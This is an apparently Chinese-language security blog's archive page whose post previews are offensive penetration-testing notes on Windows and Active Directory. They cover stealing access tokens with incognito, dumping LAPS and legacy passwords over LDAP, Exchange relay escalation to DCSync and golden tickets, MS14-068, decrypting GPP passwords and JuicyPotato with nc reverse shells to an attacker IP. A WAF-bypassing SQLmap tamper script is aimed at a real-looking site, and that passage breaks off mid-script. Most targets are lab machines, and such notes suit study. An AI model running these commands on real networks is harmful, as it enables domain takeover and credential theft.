<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Twe1ve&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
  <meta property="og:type" content="website">
<meta property="og:title" content="Twe1ve&#39;s Blog">
<meta property="og:url" content="https://github.com/page/2/index.html">
<meta property="og:site_name" content="Twe1ve&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="icon" href="/images/icon.png">
  
  
<link rel="stylesheet" href="/css/index.css">



  <!-- 百度站長統計-->
  
  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?f4e4f3d9d2532faa71e451f2ab41cbb6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>
  
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Twe1ve's Blog" type="application/atom+xml">
</head>

<div class="main height-100 flex flex-v">
  <div class="phone-header">
    <a to="/home" class="mobile-logo" > <img src="/images/logo.svg" /> </a>
    <a class="menu iconfont icon-menu" onclick="toggleMenu()"></a>
  </div>
  <div class="main-top flex flex1">
    <nuxt-link  to="/home" class="mobile-nav-btn iconfont icon-fenlei"></nuxt-link>
    <!--主页上左部分-->
    <div class="height-100 main-left  flex flex-v">
      <div class="main-left-top flex1">
        <a class="logo">
          <img src="/images/logo.svg" />
          <div class="sub-title">废物Twe1ve的垃圾展示台</div>
        </a>
        <nav class="nav">

  
    
      <a title="首页"  alt="首页"  v-for="(menu,index) in menus" href="/">
        <div class="icon"><i class="iconfont icon-home"></i></div>
        <div class="name">
          <div class="cnname">首页</div>
          <div class="enname">Home Page</div>
        </div>
      </a>

    
      <a title="归档"  alt="归档"  v-for="(menu,index) in menus" href="/archives">
        <div class="icon"><i class="iconfont icon-archives"></i></div>
        <div class="name">
          <div class="cnname">归档</div>
          <div class="enname">Archive Page</div>
        </div>
      </a>

    
      <a title="关于我"  alt="关于我"  v-for="(menu,index) in menus" href="./../about">
        <div class="icon"><i class="iconfont icon-about"></i></div>
        <div class="name">
          <div class="cnname">关于我</div>
          <div class="enname">About Me</div>
        </div>
      </a>

    
  

  <!--<a href="/link/">
    <div class="icon"><i class="iconfont icon-link"></i></div>
    <div class="name">
      <div class="cnname">友情链接</div>
      <div class="enname">Friends Web Link</div>
    </div>
  </a>-->
</nav>

      </div>

      <view class="website-msg">
        <div class="beian"><a target="_blank" href="http://www.miitbeian.gov.cn/"></a></div>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <div class="beian"><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></div>
        <!--
        <div class="theme-drsc">PowerBy:<a href="https://hexo.io" target="_blank">Hexo</a> ThemeBy:<a href="" target="_blank">Soul</a></div>
        -->
        <div class="copyright">Copyright &#169 <a href="mailto:yorojogame@gmail.com">2020 Twe1ve&#39;s Blog</a> </div>
      </view>

      <div class="social flex flex-align-center ">
        
          
            
          
        
      </div>
    </div>
    <!--主页上右部分-->
    
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/incognito-Stealing-Windows-Access-Tokens/" class="title">incognito Stealing Windows Access Tokens</a>
    <section class="desc">
  使用incognito可以窃取令牌以任意用户身份执行任意命令或payload
得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌列出域管理组成员：
net groups &quot;Domain Admins&quot; /domain0x01、ACCESS TOKEN(访问令牌)：
当用户登录时，Windows会为此用户创建访问令牌，用于存储用户的身份和特权
Token在用户创建进程或者线程时会被使用，那么这些进程或者线程能够访问哪些资源取决于当前令牌
0x02、令牌类型
Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)
Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)
这两种令牌,都会在系统重启以后被清除, 否则将会一直驻留在内存中,而授权令牌则会在用户注销以后自动被转为模拟令牌,但仍然可利用。
0x03、本地和远程的基本用法
本地： 
查看 token：
incognito.exe list_tokens–u 
获取到已注销用户 int18\administrator的token,盗取token 执行命令： 
incognito.exe execute -c &quot;int18\administrator&quot; calc.exe 远程：
incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  list_tokens -u
incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe 
0x04、提权、降权、伪造（以本地示例)
incognito execute -c &quot;NT AUTHORITYSYSTEM&quot; cmd.exe #提权至system 
incognito execute -c &quot;int\test&quot; cmd.exe #降权至当前 test 用户 
incognito execute -c &quot;int\test1&quot; cmd.exe #伪造test1 用户 0x03、获取TrustedInstaller 权限（修改系统文件）管理员、System 均无法修改系统文件、需 TrustedInstaller 权限借用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限
在CS下获取TrustedInstaller 

shell sc strat TrustedInstaller 


steal token  1700 ##ps查看TrustedInstaller进程号


shell whoami /groups

链接：
https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/
https://blog.csdn.net/qq_36374896/article/details/84261516  
https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html 
https://www.jianshu.com/p/907c6aab6fd0
http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf


</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/" class="title">域渗透之AD Recyle Bin组利用+Ldaps信息枚举</a>
    <section class="desc">
  AD Recyle Bin组利用：使用回收站还原用户，或获取用户旧密码进行碰撞
前提,需要域内启用回收站功能，且用户在AD Recyle Bin 组中
未启用启用回收站和启用回收站删除对象对比
图1：启用回收站之前已删除的Active Directory对象的生命周期

图2：启用回收站后已删除的Active Directory对象的生命周期

启用AD回收站：
Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’查看删除用户
Get-ADObject -filter &apos;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&apos; -includeDeletedObjects结果示例：
Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059尝试还原已删除账户
Restore-ADObject -Identity &apos;f0cc344d-31e0-4866-bceb-a842791ca059&apos;###使用ObjectGUID进行还原或
Get-ADObject -Filter {displayName -eq  &quot;TempAdmin&quot;} IncludeDeletedObjects | Restore-ADObject查询ms-mcs-admpwd
Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; –IncludeDeletedObjects -Property ms-mcs-admpwd  查看有关于特定账户的全部属性信息：
Get-ADObject -Filter {displayName -eq &quot;TempAdmin&quot;} -IncludeDeletedObjects -Properties *  
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz如这里存在LegacyPassword（直接缓存的旧密码）名称被自定义，通过查看所有属性列出来
Ldap枚举：获取基本的账户信息、密码ldapsearch 使用：列出基本的上下文信息
kali@kali:$ ldapsearch -h 10.10.10.182 -D  cascade.local -x -s base namingcontexts提取整个域目录的数据，然后grep筛选输出：
kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -s sub -b &quot;DC=cascade,DC=local&quot; |tee ldap.out
root@kali:$ cat ldap.out |grep -i memberof筛选输出：
kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascade,DC=local&quot; &apos;(objectClass=User)&apos; sAMAccountName sAMAccountType列出管理用户组
kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascae,DC=local&quot; &apos;(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local)&apos; |grep -i memberofDump LAPS passwords:
kali@kali:$ ldapsearch -h  -D cascade.local -x -b &quot;dc=cascade,dc=local&quot; &apos;(ms-MCS-AdmPwd=*)&apos; ms-MCS-AdmPwd同样windapsearch也是一个不错的工具
kali@kali:$./windapsearch_py2.py  --dc-ip 10.10.10.182 -d cascade.local --full --users

...
user:r.thompson
cascadeLegacyPwd: clk0bjVldmE=
...https://github.com/snovvcrash/cheatsheets/tree/master 
https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html 


</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/" class="title">域控提权之Exchange提权</a>
    <section class="desc">
  原理 ：Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync
也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限
漏洞利用：net group 查看用户组

或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions组
添加用户tw：
$pass = ConvertTo-SecureString &quot;password&quot; -AsPlainText -Force
New-ADUser tw -AccountPassword $pass -Enabled $True将用户添加到Exchange Permissions组
net group &quot;Exchange Windows Permissions&quot; tw /add 
或
Import-Module ActiveDirectory
Add-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members  tw检查是否已成功添加
net group &quot;Exchange Windows Permissions&quot; /domain 使用ntlmrelayx.py进行ntlm中继：
sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user tw运行该中继命令之后，可通过浏览器访问本地127.0.0.1进行连接（输入tw账户密码），也可使用prieexchange.py进行连接
python privexchange.py  -ah 10.10.16.21  10.10.10.161   -u tw-p password -d htb.local（10.10.16.21为我kali ip）

连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示
impacket-secretsdump htb.local/tw:password@10.10.10.161 -just-dc
进一步学习：在Linux上使用KRBTGT hash实现金票攻击
在上面的实验中，同样还获得了KRBTGT hash，下面学习学习如何在Linux上使用它
首先获取domain sid ：
Get-ADDomain htb.local
S-1-5-21-3072663084-364016917-1341370565使用NTLM生成TGT###TGT也可以使用AES-KEY生成
python ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid  S-1-5-21-3072663084-364016917-1341370565 -domain HTB.LOCAL UserDoesnotExit运行之后生成一个UserDoesnotExit.ccache缓存文件使用ccache设置ticket
export KRB5CCNAME=UserDoesnotExit.ccache
使用TGT使用下列任意方式远程执行命令
python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass执行之前需要同步域控时间，否则会出现下列错误    sudo rdate 10.10.10.161

python psexec.py HTB.LOCAL/UserDoesnotExit@HTB.LOCAL -k -no-pass不能使用IP进行连接


</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/" class="title">域控提权之ms14-068</a>
    <section class="desc">
  危害：任意域控用户都可以提权到域控一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制
一、漏洞成因在 KDC 对 PAC 进行验证时，根据协议规定必须是带有 server Hash、KDC Hash 的签名算法才可以（原本的设计是 HMAC 系列的 checksum 算法），但微软在实现上，却允许任意签名算法。只要客户端指定任意签名算法，KDC 就会使用指定的算法进行签名验证，致使导致恶意用户在发送给KDC的TG_REQ中可以创建包含管理员帐户成员身份的伪造PAC被KDC接收，并将其放入TG_REP中发布的新TGT票证中。该票证可用于向KDC要求服务票证的服务升级特权：在这种情况下，是smb服务票证。 
什么是PAC（特权帐户证书）：
PAC包含域控制器（DC）提供的授权数据，Active Directory将授权数据存储在PAC（特权帐户证书）的票证字段中。    PAC由DC在服务单的现场授权数据中提供。它用KDC密钥（只有AD知道）签名，并用要验证的服务和AD之间共享的服务密钥签名。
二、利用条件1.域控机器没有打漏洞补丁      补丁号：KB3011780
2.拥有一台域内机子及其sid三、漏洞利用漏洞检测：FindSMB2UpTime.py(但是这个并不一定准确，因为域控是一般不会重启，但是也有存在意外重启的情况，那么即使有ms14-068也不会显示)
./FindSMB2UPTime.py 192.168.31.220
DC is up since: 2013-12-28 22:24:25
This DC is vulnerable to MS14-068获取域控制器补丁状态:Get-DCPatchStatus.ps1
# This is an example script only.
import-module activedirectory
[string]$KBNumber = &quot;KB3011780&quot;
$DomainControllers = Get-ADDomainController -filter *
[int]$DomainControllersCount = $DomainControllers.Count
[int]$PatchedDCCount = 0
[int]$UnPatchedDCCount = 0
$UnpatchedDCs = @()
Write-Output &quot;Scanning $DomainControllersCount Domain Controllers for patch $KBNumber&quot;
ForEach ($DomainController in $DomainControllers)
{
    $DomainControllerHostName = $DomainController.HostName
    $PatchStatus = Get-HotFix -ID $KBNumber -ComputerName $DomainController.HostName -ErrorAction SilentlyContinue

    IF ($PatchStatus.InstalledOn)
        {
            $PatchStatusInstalledOn = $PatchStatus.InstalledOn
            Write-Output &quot;$DomainControllerHostName patched on $PatchStatusInstalledOn&quot;
            $PatchedDCCount++
        }
    Else
        {
            Write-Warning &quot;$DomainControllerHostName is NOT patched for $KBNumber (or could not be contacted)&quot;
            [array]$UnpatchedDCs += $DomainController.HostName
            $UnPatchedDCCount++
        }
}
Write-Output &quot;Out of $DomainControllersCount DCs, Patched: $PatchedDCCount &amp; UnPatched: $UnPatchedDCCount &quot;
IF ($UnpatchedDCs)
{
    Write-Output &quot;The following DCs are NOT patched for $KBNumber&quot;
    $UnpatchedDCs
}环境描述：
目标机器：10.10.10.52  Windows Server 2008 R2 Standard
已获取：DC上的一个普通本地账户

james用户账户密码


james sid （可通过多种途径获取rpclient：lookupnames james目标机器shell中：whoami /all ，）

攻击机：kali 10.10.14.14  （不在域中）
在Linux上：(没有目标shell的情况下)1.安装客户端，在客户端生成票证
sudo apt-get install krb5-user cifs-utils rdate2./etc/hosts中添加：（内网机器没有映射，所以需要添加）
10.10.10.52 htb.local htb mantis.htb.local  mantis3.编辑/etc/krb5.conf
[libdefaults]
    default_realm = HTB.LOCAL

[realms]
   HTB.LOCAL = {
    kdc = mantis.htb.local:88
    admin_server = mantis.htb.local
    default_domain = HTB.LOCAL
    }
[domain_realm]
    .domain.internal = HTB.LOCAL
    domain.internal = HTB.LOCAL4.添加路由：编辑/etc/resolve.conf
nameserver 10.10.10.525.同步域控时间（确定DC的时间（用于票证同步），按照RFC必须在5分钟内完成，但+ -30分钟的偏差也可以的）

[方法1]net time -S 10.10.10.52 -U“” ##获取DC时间，然后收到设置本机时间

[方法2]sudo rdate -n 10.10.10.52  ###直接同步到域控时间


6.为james用户生成一张新的Kerberos票证
kinit -V james@HTB.LOCAL       ###kinit中域名需要大写；或直接 kinit james
klist
此时生成的是jame是的票证：访问C$是没有权限的
kali@kali:~/tools/AD_Recon/pykek$ smbclient -W HTB.LOCAL //MANTIS/c$ -k
tree connect failed: NT_STATUS_ACCESS_DENIED7.ms14-068生成高权限TGT票证

8.替换低权限票证
mv TGT_james@HTB.LOCAL.ccache  /tmp/krb5cc_10009.smb成功登录C$

Mimikatz：先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令
ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis将TGT_james@HTB.LOCAL.ccache文件放入mimikatz目录中
mimikatz.exe log &quot;kerberos::ptc TGT_james@HTB.LOCAL.ccache&quot; exit注入成功即可获得域管理session，可以klist看一下是否有了kerberos Ticket
net use \\htb.local\admin$    ####使用IP可能会失败
dir \\htb.local\c$ 
psexec  \\htb.local  cmd.exe突破“本地账户才能漏洞利用”的限制：先 klist purgr清除缓存证书，再使用mimikatz生成高权限TGT的缓存证书进行连接原理：https://www.freebuf.com/vuls/56081.html
GoldenPac,py也有更简便的方法，不需要上边的种种配置，直接使用impacket套件下的GoldenPac一发入魂（ms14-068+psexec）



</section>
    <p class="sub">Apr 25, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/" class="title">Kerberos认证学习</a>
    <section class="desc">
  Kerberos简介：

Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）

几乎每次互动，都会收到两条消息（一个用于响应，另一个则用于请求下一个服务）

Kerberos非常依赖加密密钥，所有通信步骤中都用到共享密钥




1、AS-REQClient将用户密码转换成NTLM hash，使用该hash对时间戳进行加密;然后将纯文本形式的时间戳以及身份信息[你的名称/ID、请求的服务名称/ID(这里为TGS：Ticket Granting Server)]、TGT生存期等）发送给AS
2、AS-REPAS收到Client发送的身份信息，从KDC数据库中检索身份信息（只检查用户是否存在，而不检查用户凭据）。用户存在则生成一个随机的session key（会话密钥）[用于给Client请求TGS]    
AS向Clinet发送两条消息：        
消息1包含如下信息：[使用TGS SECRET KEY（同样存储在KDC数据库中）加密]—&gt;也就是使用TGS密钥加密TGT
步骤1中用户提供的信息+TGS SESSION KEY                
消息2包含如下信息：[使用用户密钥（也就是用户NTLM hash）加密]     
TGS名称/ID            
时间戳            
TGS SESSION KEY
TGT生存期`消息1为Client所请求的TGT，但是由于没有TGS SCRECT KEY,所以无法解密，此时TGT存储在Client凭据缓存中 消息2解密后获得TGS SESSION KEY
3、TGS-REQ(金票攻击发生在此步骤)
Client向TGS发送两条消息消息1：[使用TGS SESSION KEY进行加密]  
你的名称/ID
时间戳`消息2：[未加密消息]
所要请求服务的名称/ID
服务的有效生存期同时还会发送步骤2中收到的TGT。TGS收到Client信息，会先到KDC数据库中检查请求的服务是否存在
4、   TGS-REPTGS使用TGS SECRET KEY解密得到未加密的TGT，包含TGS SESSION KEY,TGS SESSION KEY解密Client消息中的加密信息解密之后，TGS对如下信息进行检查    
步骤3中消息1解密后得到的用户名称/ID与TGT的进行比较
步骤3中消息1解密后得到的时间戳与TGT中的进行比较（默认为2分钟
检查TGT是否过期
检查TGS缓存中是否已有该用户凭据，避免重播检查无误之后，同样向客户端发送两条消息
消息1：[生成的使用Service Secret Key加密后的TGS]—-&gt;Kerberos令牌
消息2：[TGS Session Key加密]    
服务名称/ID   
时间戳    
票据生存期    
Service Session Key5、AP-REQ银票攻击发生在此步骤
Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SESSION KEY加密如下消息：    
用户名称/ID
时间戳`该消息加密之后与和TGS一同发送给服务端服务端使用SERVER SECRET KEY解密TGS，验证完成，服务端允许Client在TGS中指定的时间内访问请求资源
6、AP-REP启用相互认证的情况下，交换时间戳进行相互认证


</section>
    <p class="sub">Apr 25, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/" class="title">域内提权之滥用GGP</a>
    <section class="desc">
  在SYSVOL查找密码组策略首选项（GPP）中的密码
原理：什么是GPP
GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途
一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。
该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）
这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）
漏洞利用：连接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，它们将位于格式类似于以下的文件夹中：
\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml1、定位域控制器
set l   
nltest /DSGETDC:
echo %logonserver%
net time /domain
......2、查询DC共享目录使用enumlinux或者smbmap检查共享目录：
smbmap -H 10.10.10.100  ###列出目标用户共享列表
---- -----------
ADMIN$ NO ACCESS
C$ NO ACCESS
IPC$ NO ACCESS
NETLOGON NO ACCESS
replication read only   
SYSVOL NO ACCESS
Users NO ACCESS3、连接域共享
smbclient //active.htb/Replication -N
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\more Groups.xml
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;4、解密使用gpprefdecrypt.py： 
python gpprefdecrypt.pyedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

</section>
    <p class="sub">Apr 25, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/" class="title">JuicyPotato提权</a>
    <section class="desc">
  项目地址：https://github.com/ohpe/juicy-potato/
0x01、前言Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广
利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用
whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken


0x02、JuicyPotato功能自主选择CLSID
-c ‘clsid’         #### clsid查找：http://ohpe.it/juicy-potato/CLSID/ 
自定义COM监听端口
-l : COM server listen port
COM监听地址
-m : COM server listen address (default 127.0.0.1)
进程创建模块 
-t createprocess call:  CreateProcessWithTokenW,  CreateProcessAsUser, &lt;*&gt; try both
执行指定进程或脚本
-p : program to launch
为指定的执行进程选择参数
-a : command line argument to pass to program (default NULL)
RPC服务地址
-k : RPC server ip address (default 127.0.0.1)
RPC服务端口：
-n : RPC server listen port (default 135)
支持测试模块；测试并查找clsid
-z only test CLSID and print token’s user
0x03、JuicyPotato使用依赖于clsid：PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
COM -&gt; recv failed with error: 10038查找替换http://ohpe.it/juicy-potato/CLSID/  很幸运2012 Standard中的第一条就成功了：
./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;

反弹shell：./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;或者将paylaod写入bat，-p参数执行bat
echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat
./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;RDP下提权：直接弹出一个system权限窗口
./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe  -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;0x04、CLSID快速验证[1]获取可用CLSID列表
提取CLSID Powershell脚本 GetCLSID.ps1
同级目录下需要有Join-Object.ps1
GetCLSID.ps1执行成功后生成文件CLSID.list和CLSID.csv(在windows对应版本的目录下，如Windows_Server_2012_R2_Datacenter)
Invoke-WebRequest -Uri http://10.10.14.14:8000/Join-Object.ps1 -outfile ./Join-Object.ps1
Invoke-WebRequest -Uri http://10.10.14.14:8000/GetCLSID.ps1 -outfile ./GetCLSID.ps1
powershell -ep bypass -f GetCLSID.ps1
##Get-Content GetCLSID.ps1 | PowerShell.exe -noprofile -枚举所有满足条件的CLSID:
New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N=&apos;CLSID&apos;; E={$_.pschildname}} | where-object {$_.appid -ne $null}
foreach($a in $CLSID)
{
Write-Host $a.CLSID
}[2]批处理调用juicypotato.exe逐个测试CLSID
test_clsid.bat:
@echo off
:: Starting port, you can change it
set /a port=10000
SETLOCAL ENABLEDELAYEDEXPANSION
FOR /F %%i IN (CLSID.list) DO (
   echo %%i !port!
   juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log
   set RET=!ERRORLEVEL!
   :: echo !RET!
   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1
)0x05、限制条件
需要支持SeImpersonate或者SeAssignPrimaryToken权限
开启DCOM
本地支持RPC或者远程服务器支持PRC并能成功登录
能够找到可用的COM对象

https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/


</section>
    <p class="sub">Apr 22, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/" class="title">一次注入实战引发的SQLMAP修改之路</a>
    <section class="desc">
  首发于先知社区：https://xz.aliyun.com/t/6864
#一、    前言SQLmap的payload修改一般有两种方式:  1、编写tamper  2、修改/添加sqlmap的xml文件语句自定义payload
#二、    注入点Fuzz选中目标网站：http://www.xxxx.com/journals_desc.php?id=40单引号报错，对单引号进行转义，id=0=0测试回显正常，int型注入

Order by 猜字段值为7
Waf为Modsec，直接使用union select被拦截：

Fuzz：
单个union    #不拦截
单个select    #不拦截
Union select  #拦截
union /**/ select #拦截
/*!00000union*/ select #内联注释，不拦截
/*!50000union*/ select 1,2,3,4,5,6,7 
此处应该是涉及到强弱类型转换的问题，int为强类型，猜测对应的字段为弱类型解决方法：[1]使用string方法、但单引号’ 被被转义了,所以该方法行不通
[2]采用报错注入
#三、编写简单Tamper脚本绕过（使用自带的modsecurityzeroversioned.py不能绕过）
报错注入过程中，发现主要过滤关键词from和函数concat（）
1、concat()被过滤:concat()--&gt;concat/**/()  对应tamper脚本concat2concatcomment.py如下：
#!/usr/bin/env python2
&quot;&quot;&quot;
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file &apos;LICENSE&apos; for copying permission
&quot;&quot;&quot;
from lib.core.compat import xrange
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW
def dependencies():
pass
def tamper(payload, **kwargs):
return payload.replace(&quot;CONCAT&quot;,&quot;CONCAT/**/&quot;)2、from被过滤，from–&gt;/*!44144from*/对应tamper脚本from.py如下：
#!/usr/bin/env python2
&quot;&quot;&quot;
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file &apos;LICENSE&apos; for copying permission
&quot;&quot;&quot;
from lib.core.compat import xrange
